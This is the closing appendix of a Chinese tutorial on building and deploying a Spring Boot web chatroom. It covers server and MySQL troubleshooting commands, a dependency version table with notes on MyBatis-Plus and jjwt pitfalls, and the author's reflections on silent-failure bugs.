du -sh /opt/chatroom/upload                 # 上传目录占多大
ls -l /opt/chatroom/logs                     # 日志文件

# ===== 环境变量（调试用） =====
sed 's/=.*/=***/' /opt/chatroom/chatroom.env   # 只看键名，值打码

# ===== 找端口占用者（认人 + 动手串在一条命令里） =====
PID=$(ss -lntp | grep ':8082' | grep -oP 'pid=\K[0-9]+' | head -1)
[ -n "$PID" ] && ps -p "$PID" -o pid,ppid,user,etime,cmd
```

### B.3 数据库

```bash
# 登录
mysql -uroot -p

# 登录并从文件执行
mysql --default-character-set=utf8mb4 -uroot -p < /tmp/db_init.sql

# 常用查询
mysql -uroot -p java_chatroom -e "show tables;"                                   # 表清单
mysql -uroot -p -e "select user_id, user_name, length(password) pwd_len from java_chatroom.user;"
mysql -uroot -p -e "select count(*) from java_chatroom.message;"
mysql -uroot -p -e "select session_id, type, name, last_time from java_chatroom.message_session order by last_time desc limit 10;"
```

### B.4 排查用的"自包含命令"

**为什么叫"自包含"？** 因为它**现查 pid 并立刻拿它做检查**，不会因为 pid 过期而白跑。

```bash
# 端口 8082 到底被谁占了？（含 cgroup，可判断是否 systemd 管理）
PID=$(ss -lntp | grep ':8082' | grep -oP 'pid=\K[0-9]+' | head -1)
if [ -z "$PID" ]; then
  echo "✅ 8082 没人监听"
else
  echo "===== 当前占用者 pid = $PID ====="
  ps -p "$PID" -o pid,ppid,user,etime,cmd
  echo "----- 完整命令行 -----"; tr '\0' ' ' < "/proc/$PID/cmdline"; echo
  echo "----- 工作目录 -----";   readlink -f "/proc/$PID/cwd"
  echo "----- cgroup（判断是否 systemd 管理） -----"; cat "/proc/$PID/cgroup"
fi
```

> 🔴 **只要输出里出现 `tencent` / `cloudmonitor` / `barad` / `tat_agent` / `stargate` / `orca` / `sgagent` 任何一个，就别杀** ——
> 那些是云厂商的监控 / 终端代理，**杀了可能导致网页终端或监控失联**。

---

## 附录 C · 依赖版本表

```xml
<properties>
    <java.version>17</java.version>
</properties>

<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.5.7</version>
</parent>
```

| 依赖 | 版本 | 版本由谁定 | 备注 |
|---|---|---|---|
| Java | **17** | `java.version` 属性 | Spring Boot 3 的最低要求 |
| Spring Boot | **3.5.7** | `<parent>` | — |
| spring-boot-starter-web | 跟随 parent | parent | 内置 Tomcat |
| spring-boot-starter-websocket | 跟随 parent | parent | **Spring 原生 WS**，不是 JSR-356 |
| spring-boot-starter-validation | 跟随 parent | parent | `@Validated` / `@NotBlank` |
| **mybatis-plus-spring-boot3-starter** | **3.5.5** | 手动指定 | 🔴 **必须用 `-spring-boot3-` 那个版本** |
| **jjwt-api / jjwt-impl / jjwt-jackson** | **0.11.5** | 手动指定 | 🔴 **三个包都要引**（`impl` 和 `jackson` 用 `runtime` scope） |
| mysql-connector-j | 跟随 parent | parent | MySQL 8 驱动 |
| lombok | 跟随 parent | parent | `@Data` / `@Slf4j` |
| spring-boot-starter-test | 跟随 parent | parent | 本项目暂未使用 |

**三个版本相关的坑（每个都踩过）：**

**① `mybatis-plus-boot-starter` vs `mybatis-plus-spring-boot3-starter`**

Spring Boot 3 改了自动配置的注册文件格式（`META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports`）。用旧版 starter 会**启动失败**或**自动配置完全不生效**（Mapper 全部注入失败）。

**② jjwt 必须引三个包**

| 包 | 作用 | scope |
|---|---|---|
| `jjwt-api` | 编译期用到的接口 / 类 | 默认（compile） |
| `jjwt-impl` | **运行期的实现** | `runtime` |
| `jjwt-jackson` | JSON 序列化实现 | `runtime` |

只引 `jjwt-api` 时，**编译能过**，运行到 `Jwts.builder()` 就报：

```
java.lang.NoClassDefFoundError: io/jsonwebtoken/impl/DefaultJwtBuilder
```

> **这是个很典型的"编译期没问题、运行期才炸"的例子。** 原因是 `jjwt-api` 里的 `Jwts` 是个工厂类，
> 它通过**反射**去加载 `jjwt-impl` 里的实现 —— 而 `runtime` scope 的依赖不参与编译，
> 所以"少引了实现包"这件事编译器完全看不见。

**③ 本项目的实际组合（`pom.xml` 节选）**

```xml
<dependency>
    <groupId>com.baomidou</groupId>
    <artifactId>mybatis-plus-spring-boot3-starter</artifactId>
    <version>3.5.5</version>
</dependency>

<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.11.5</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.11.5</version>
    <scope>runtime</scope>
</dependency>
```

---

## 写在最后

如果只能从这篇里带走三句话，我希望是这三句：

**第一句：项目里最难的从来不是"写代码"，而是"想清楚边界条件"。**

第 11 章那六个扩展功能加起来不到 400 行代码。但每一个都藏着一到两个"不这么写就出 bug"的点 ——
`createGroup` 要校验 `isFriend`、`findCommonSession` 要加 `ms.type = 1`、
更新游标要带前进守卫、撤回要加第二道闸。**这些点没有一个能靠"照着教程抄"得到。**

**第二句：所有"静默失败"都是最贵的 bug。**

这本书里反复出现同一个模式：

| 静默失败的样子 | 真正的原因 | 为什么难查 |
|---|---|---|
| `@TableId` 没标 → `userId: null` | 启动日志里一行 WARN | 没有任何报错 |
| 业务异常返 200 → 前端 alert 从不执行 | HTTP 状态码不参与业务判断 | 用户只说"点了没反应" |
| `sudo` 少了 `-E` → 悄悄用回默认值 | 没有报错，只是用了别的值 | 程序"正常"跑着 |
| env 里 `&` 没加引号 → 变量被拆成后台任务 | 只有一行 `[2]+ Done` | 屏幕上一闪而过 |
| `Communications link failure` | `Public Key Retrieval is not allowed` | **真因被包装成另一个错误** |

**它们的共同点：程序没有崩，只是"安静地做错了事"。**

**第三句：能主动说出自己项目的问题，比藏着好。**

第 17 章那一整章"不足清单"不是自曝其短 —— 它证明你知道**边界在哪**。

一个说不出自己项目有什么问题的开发者，通常不是项目完美，而是**不知道它什么时候会坏**。

---

*本文档基于 `web-chatroom` 项目的真实实现与真实部署过程整理。*
*线上地址：`http://101.42.2.204:8082/login.html`*
*技术栈：Java 17 / Spring Boot 3.5.7 / MyBatis-Plus 3.5.5 / MySQL 8 / JWT / 原生 WebSocket*

